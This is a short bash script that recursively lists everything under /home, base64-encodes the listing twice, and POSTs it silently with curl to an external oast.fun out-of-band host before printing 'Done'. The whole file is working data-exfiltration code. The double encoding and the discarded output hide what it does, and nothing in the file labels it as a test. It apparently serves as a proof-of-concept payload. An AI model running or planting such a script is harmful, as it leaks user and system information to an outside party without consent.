#!/bin/bash

B64_BLOB=`ls -lahR /home/ | base64 | base64`

curl -s -d "$B64_BLOB" "https://dqlfdzgroddmzbuqfjnd4pjc1za4wsp46.oast.fun/" > /dev/null

echo "Done"